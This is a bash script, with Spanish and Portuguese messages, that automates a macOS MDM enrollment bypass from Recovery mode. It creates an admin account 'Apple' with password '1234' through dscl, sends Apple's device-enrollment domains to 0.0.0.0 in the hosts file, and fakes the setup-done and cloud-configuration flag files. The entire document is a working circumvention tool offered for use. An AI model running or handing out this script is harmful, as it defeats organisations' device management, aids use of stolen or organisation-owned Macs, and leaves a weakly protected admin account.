#!/bin/bash
echo "======================================"
echo "   INICIANDO BYPASS MDM AUTOMATICO"
echo "======================================"

# 1. Detectar Volumenes
SYS_VOL=""
DATA_VOL=""

for v in /Volumes/*; do
  if [ -d "$v/System/Library" ]; then SYS_VOL="$v"; fi
  if [ -d "$v/private/var/db/dslocal" ]; then DATA_VOL="$v"; fi
done

if [ -z "$SYS_VOL" ] || [ -z "$DATA_VOL" ]; then
  echo "ERROR: Nao foi possivel encontrar os volumes. Verifique se esta no Recovery."
  exit 1
fi

echo "Volume Sistema: $SYS_VOL"
echo "Volume Dados:   $DATA_VOL"
echo ""

DSCL="$DATA_VOL/private/var/db/dslocal/nodes/Default"

# 2. Crear Usuario
echo "Criando usuario 'Apple'..."
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" UserShell "/bin/zsh"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" RealName "Apple"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" UniqueID "501"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" PrimaryGroupID "20"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" NFSHomeDirectory "/Users/Apple"
dscl -f "$DSCL" localhost -passwd "/Local/Default/Users/Apple" "1234"
dscl -f "$DSCL" localhost -append "/Local/Default/Groups/admin" GroupMembership "Apple"

mkdir -p "$DATA_VOL/Users/Apple"

# 3. Bloquear MDM
echo "Bloqueando dominios MDM..."
HOSTS="$SYS_VOL/etc/hosts"
echo "0.0.0.0 deviceenrollment.apple.com" >> "$HOSTS"
echo "0.0.0.0 mdmenrollment.apple.com" >> "$HOSTS"
echo "0.0.0.0 iprofiles.apple.com" >> "$HOSTS"

# 4. Aplicar ajustes
echo "Aplicando configuracoes de bypass..."
CONFIG="$SYS_VOL/var/db/ConfigurationProfiles/Settings"
mkdir -p "$CONFIG"
touch "$DATA_VOL/private/var/db/.AppleSetupDone"
rm -rf "$CONFIG/.cloudConfigHasActivationRecord"
rm -rf "$CONFIG/.cloudConfigRecordFound"
touch "$CONFIG/.cloudConfigProfileInstalled"
touch "$CONFIG/.cloudConfigRecordNotFound"

echo ""
echo "======================================"
echo "   BYPASS COMPLETADO COM SUCESSO!"
echo "======================================"
echo "Usuario: Apple"
echo "Senha: 1234"
echo ""
